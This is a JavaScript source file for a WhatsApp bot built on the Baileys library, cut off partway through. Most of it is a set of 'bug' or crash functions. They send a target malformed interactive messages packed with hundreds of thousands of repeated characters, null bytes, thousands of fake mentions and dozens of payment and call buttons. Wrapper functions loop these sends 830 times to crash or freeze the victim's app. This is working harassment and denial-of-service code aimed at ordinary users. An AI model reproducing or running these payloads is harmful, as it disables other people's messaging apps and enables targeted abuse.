//zaxyz-is-here rawrr

//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./database/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃GOOD MALAM KONTOL"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄SELAMAT SORE YTM DARI zaxyz"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️NGANTUK GW DAH SIANG"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️BANGUN OYY"
} else {
    ucapanWaktu = "🌆SAHUR SAHUR OY"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/kltqkj.jpg"
const Xxx = "https://files.catbox.moe/kltqkj.jpg"
const ryclol = fs.readFileSync('./image/v3.jpeg')
const babi = fs.readFileSync('./image/v3.jpeg')
const babi2 = fs.readFileSync('./image/v3.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')
//END

//DATA ADDBOT / JADIBOT PAIRING
const {
	jadibot,
	stopbot,
	listjadibot
} = require('./database/jadibot')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

//END
//FUNCTION LOADING


async function zaxyz(target) {
for (let i = 0; i <= 830; i++) {
await protocolbug(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await flowerColors(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await flowerColors(target)
await delayMakerInvisible(target)
await protocolbug(target)
await protocolbug(target)
await protocolbug(target)
    }
}


async function kontol(target) {
for (let i = 0; i <= 830; i++) {
await protocolbug(target)
await protocolbug(target)
await delayMakerInvisible(target)
await nativeloc(target) 
await nativemessage(target)
await darkflower(target)
await flowerColors(target)
await Blanking(target)
await CrlButton(target)
await UiXGhvY(target)
await invc2(target)
await InVisibleX(target)
await FlowX(target) 
await delayMakerInvisible(target)
await nativeloc(target) 
await nativemessage(target)
await darkflower(target)
await flowerColors(target)
await Blanking(target)
await CrlButton(target)
await UiXGhvY(target)
await invc2(target)
await InVisibleX(target)
await FlowX(target) 
await delayMakerInvisible(target)
await nativeloc(target) 
await nativemessage(target)
await darkflower(target)
await flowerColors(target)
await Blanking(target)
await CrlButton(target)
await UiXGhvY(target)
await invc2(target)
await InVisibleX(target)
await FlowX(target) 
await protocolbug(target)
await protocolbug(target)
    }
}


async function protocolbug(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@tamainfinity",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await sock.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}


async function delayMakerInvisible(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𝐇𝐚𝐳𝐚𝐳𝐞𝐥 𝐗𝐯𝐗🚀 𖣂      - 〽${"ꥈ𝐇𝐚𝐳𝐚𝐳𝐞𝐥 𝐗𝐯𝐗🚀ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐇𝐚𝐳𝐚𝐳𝐞𝐥 𝐗𝐯𝐗🚀 ********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await sock.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}

async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗦𝗶𝗹𝗲𝗻𝗰𝗲 𝗩𝟱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗥𝗲𝗮𝗱𝘆 ᐛ",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗦𝗶𝗹𝗲𝗻𝗰𝗲 𝗩𝟱 𝗔𝗹𝘄𝗮𝘆𝘀 𝗥𝗲𝗮𝗱𝘆 ᐛ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function InVisibleX(target, sock) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𑲭𑲭͠*zaxyz is here⚡* 𐎟𑆻",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*⃟⃟༑‌‌͠*zaxyz is here⚡*〠⃰‌⃟༑‌⃟༑⌁⃰‌‌╴‌ᝄ*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (sock) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "🎭⃟༑⌁⃰*zaxyz is here⚡*ཀ‌‌🐉",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }


async function invc2(target) {
     let nomor = target
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🎭⃟༑⌁⃰*zaxyz is here⚡*ཀ‌",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "🎭⃟༑⌁⃰*zaxyz is here⚡*ཀ‌"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function UiXGhvY(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒*zaxyz is here⚡*ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒*zaxyz is here⚡*ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒*zaxyz is here⚡*ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function CrlButton(target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/n1nqsc.jpg" } }, 
                                            { upload: sock.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text:"🎭⃟༑⌁⃰*zaxyz is here⚡*ཀ‌‌🐉" + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂⊱*zaxyz is here⚡*⊰😂",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://t.me/Whhwhahwha\",\"merchant_url\":\"https://t.mw/Whhwhahwha\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: qkontak }
    );
    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Send By zaxyz-is-here ")
}

async function Blanking(target) {
let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
newsletterName: "*zaxyz is here⚡*",
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://files.catbox.moe/gpxahn.jpg",
gifPlayback: true
}
}, {
upload: sock.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "*zaxyz is here⚡*" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
